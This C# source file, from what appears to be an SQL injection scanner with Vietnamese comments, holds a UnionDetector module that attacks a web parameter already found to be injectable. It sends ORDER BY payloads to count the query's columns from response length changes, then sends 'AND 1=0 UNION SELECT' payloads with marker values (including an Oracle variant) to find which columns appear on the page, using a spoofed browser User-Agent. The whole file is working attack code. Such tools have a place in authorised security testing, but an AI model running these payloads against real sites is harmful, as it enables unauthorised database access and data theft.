using SQLiScanner.Models;
using SQLiScanner.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http; // Cần thêm cái này
using System.Threading.Tasks;

namespace SQLiScanner.Modules
{
    public class UnionDetector
    {
        private readonly HttpClient _client;
        public UnionDetector(HttpClient client)
        {
            _client = client;
        }

        public async Task<int> GetColumnCountAsync(CrawlResult target, DetectionResult detectedData)
        {
            Console.WriteLine("\n[+] BẮT ĐẦU DÒ SỐ CỘT (ORDER BY)");
            Console.WriteLine($"    [*] Target Param: {detectedData.VulnerableParam}");

            string originalValue = target.Params[detectedData.VulnerableParam];
            int baseLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, originalValue);

            Console.WriteLine($"    [*] Base Length (Clean): {baseLength} bytes");

            if (baseLength <= 0)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Không thể lấy nội dung của web. Target có thể đã chết hoặc chặn kết nối.");
                Console.ResetColor();
                return -1;
            }

            for (int i = 1; i <= 50; i++)
            {
                // Payload: value' ORDER BY 1 -- 
                string payload = $"{originalValue}{detectedData.WorkingPrefix} ORDER BY {i}{detectedData.WorkingSuffix}";

                int currentLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, payload);

                bool isError = Math.Abs(currentLength - baseLength) > baseLength * 0.2;

                if (isError)
                {
                    if (i == 1)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[-] Lỗi ngay tại ORDER BY 1. Prefix [{detectedData.WorkingPrefix}] có thể chưa chuẩn hoặc WAF chặn.");
                        Console.WriteLine($"    Kích thước gốc: {baseLength} | Kích thước hiện tại: {currentLength}");
                        Console.ResetColor();
                        return -1;
                    }

                    int colCount = i - 1;
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[!] ORDER BY {i} gây lỗi -> Số cột là: {colCount}");
                    Console.ResetColor();
                    return colCount;
                }
                else
                {
                    Console.Write($"\r    Checking ORDER BY {i}: OK (Kích thước: {currentLength})    ");
                }
            }

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"[-] Thất bại. Đã thử 50 cột mà không thấy lỗi.");
            Console.ResetColor();
            return -1;
        }

        public async Task<List<int>> GetVisibleColumnsAsync(CrawlResult target, DetectionResult detectedData, int colCount)
        {
            Console.WriteLine("\n[+] Bắt đầu tìm cột hiển thị (UNION SELECT)");

            List<int> visibleCols = new List<int>();
            string fromTable = detectedData.DatabaseType == DbType.Oracle ? " FROM DUAL" : "";
            string originalValue = target.Params[detectedData.VulnerableParam];

            for (int i = 0; i < colCount; i++)
            {
                var payloadParts = Enumerable.Repeat("NULL", colCount).ToList();

                string magicTag = $"99{i + 1:D2}"; // VD: 9901
                string magicString = $"'{magicTag}'";

                payloadParts[i] = magicString;
                string unionPart = string.Join(",", payloadParts);

                string payload = $"{originalValue}{detectedData.WorkingPrefix} AND 1=0 UNION SELECT {unionPart}{fromTable}{detectedData.WorkingSuffix}";

                try
                {
                    // Ở đây ta cần HTML string để tìm text '9901'
                    string? html = await SendPayloadGetStringAsync(target, detectedData.VulnerableParam, payload);

                    if (!string.IsNullOrEmpty(html) && html.Contains(magicTag))
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"[!] Cột số {i + 1} hiển thị được dữ liệu (Text/String).");
                        Console.ResetColor();
                        visibleCols.Add(i + 1);
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"[-] Cột số {i + 1} KHÔNG hiển thị được dữ liệu.");
                    Console.ResetColor();
                }
            }

            if (visibleCols.Count == 0)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[-] KHÔNG TÌM THẤY PHẢN HỒI MONG MUỐN. (Cần phải sử dụng kĩ thuật Blind SQLi)");
                Console.ResetColor();
            }

            return visibleCols;
        }

        #region Các hàm phụ trợ
        private async Task<int> GetResponseLengthAsync(CrawlResult target, string paramKey, string payloadValue)
        {
            try
            {
                byte[]? bytes = await SendPayloadGetBytesAsync(target, paramKey, payloadValue);
                return bytes == null ? -1 : bytes.Length;
            }
            catch { return -1; }
        }

        private async Task<byte[]?> SendPayloadGetBytesAsync(CrawlResult target, string paramKey, string payloadValue)
        {
            try
            {
                var finalParams = new Dictionary<string, string>(target.Params);
                finalParams[paramKey] = payloadValue;


                var method = new HttpMethod(target.HttpMethod.ToUpper());

                HttpRequestMessage request;

                if (method == HttpMethod.Get)
                {
                    var uriBuilder = new UriBuilder(target.FullUrl);
                    var query = System.Web.HttpUtility.ParseQueryString(string.Empty);
                    foreach (var p in finalParams) query[p.Key] = p.Value;
                    uriBuilder.Query = query.ToString();

                    request = new HttpRequestMessage(method, uriBuilder.ToString());
                }
                else
                {
                    request = new HttpRequestMessage(method, target.FullUrl);
                    request.Content = new FormUrlEncodedContent(finalParams);
                }

                if (!request.Headers.Contains("User-Agent"))
                {
                    request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                }

                using var response = await _client.SendAsync(request, HttpCompletionOption.ResponseContentRead);

                var bytes = await response.Content.ReadAsByteArrayAsync();

                return bytes;
            }
            catch 
            {
                return null;
            }
        }

        private async Task<string?> SendPayloadGetStringAsync(CrawlResult target, string paramKey, string payloadValue)
        {
            try
            {
                byte[]? bytes = await SendPayloadGetBytesAsync(target, paramKey, payloadValue);
                return bytes == null ? "" : System.Text.Encoding.UTF8.GetString(bytes);
            }
            catch { return ""; }
        }
        #endregion
    }
}